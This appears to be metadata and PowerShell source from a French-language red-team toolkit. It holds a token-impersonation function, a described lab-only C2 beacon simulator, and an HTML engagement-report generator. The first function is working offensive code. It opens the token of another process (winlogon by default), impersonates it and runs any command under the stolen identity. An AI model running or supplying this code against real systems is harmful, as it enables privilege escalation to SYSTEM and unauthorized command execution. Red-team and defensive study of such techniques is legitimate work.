functions.name: Invoke-TokenImpersonation
functions.description: Impersonnifie un token de processus existant (SYSTEM ou autre) via les API Win32 natives (pas de binaire externe).

parameters.name: ProcessName
parameters.description: Processus dont on vole le token

parameters.name: Command
parameters.description: Commande à exécuter sous le token volé

returns.description: Output de la commande exécutée sous le nouveau contexte

functions.source:
function Invoke-TokenImpersonation {
    param([string]$ProcessName='winlogon', [string]$Command='whoami /all')
    $sig = @'
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool CloseHandle(IntPtr hObject);
'@
    $Advapi32 = Add-Type -MemberDefinition $sig -Name 'Advapi32' -Namespace 'Win32' -PassThru
    $proc = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
    $hToken = [IntPtr]::Zero
    $TOKEN_QUERY = 0x0008; $TOKEN_IMPERSONATE = 0x0004
    $ok = $Advapi32::OpenProcessToken($proc.Handle, ($TOKEN_QUERY -bor $TOKEN_IMPERSONATE), [ref]$hToken)
    if(-not $ok){ throw "OpenProcessToken failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)" }
    $ok2 = $Advapi32::ImpersonateLoggedOnUser($hToken)
    if(-not $ok2){ throw "ImpersonateLoggedOnUser failed" }
    Write-RTLog "TOKEN_IMPERSONATE: Process=$ProcessName | PID=$($proc.Id)" -Level 'ACTION'
    $result = & cmd.exe /c $Command 2>&1
    [Security.Principal.WindowsIdentity]::Impersonate([IntPtr]::Zero) | Out-Null # revert
    $Advapi32::CloseHandle($hToken) | Out-Null
    return $result
}

functions.description: Simule un beacon HTTP C2 avec jitter aléatoire. Envoie des heartbeats vers un endpoint contrôlé (loopback ou lab). Ne communique jamais vers Internet.

functions.name: New-RTEngagementReport
functions.description: Génère un rapport HTML complet de l'engagement à partir du fichier de log RT_Ops.log : timeline, findings par phase MITRE, score de criticité.
functions.source:
function New-RTEngagementReport { param([string]$LogPath="$env:TEMP\RT_Ops.log", [string]$OutputPath="$env:TEMP\RT_Report_$(Get-Date -Format yyyyMMdd).html", [string]$EngagementName='DSI Red Team Engagement') if(-not (Test-Path $LogPath)){ Write-RTLog "REPORT_FAIL: Log introuvable ($LogPath)" -Level 'ERROR'; return $null } $lines = Get-Content $LogPath # Parser les entrées du log $entries = $lines | ForEach-Object { if($_ -match '\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\[([A-Z]+)\] (.*)'){ [PSCustomObject]@{ TS=$Matches[1]; Level=$Matches[2]; Msg=$Matches[3] } } } # Compter par niveau $actions = ($entries | Where-Object Level -eq 'ACTION').Count $warns = ($entries | Where-Object Level -eq 'WARN').Count $errors = ($entries | Where-Object Level -eq 'ERROR').Count $exfils = ($entries | Where-Object Level -eq 'EXFIL').Count # Score de criticité $score = [Math]::Min(100, ($actions * 3) + ($exfils * 10) + ($warns * 1)) # Tableau HTML des entrées $rows = $entries | ForEach-Object { $color = switch($_.Level){'ERROR'{'#ff6b6b'}'WARN'{'#ffd93d'}'ACTION'{'#6bcb77'}'EXFIL'{'#ff4d4d'}default{'#f0f0f0'}} "$($_.TS)$($_.Level)$($_.Msg)" } $html = @" $EngagementName

$EngagementName

Généré le $(Get-Date)

Actions: $actions | Warnings: $warns | Errors: $errors | Exfils simulées: $exfils | Score criticité: $score/100

TimestampLevelMessage $($rows -join "`n") "@ $html | Out-File $OutputPath -Encoding UTF8 Write-RTLog "REPORT_GENERATED: $OutputPath | Score=$score/100" -Level 'ACTION' return $OutputPath }
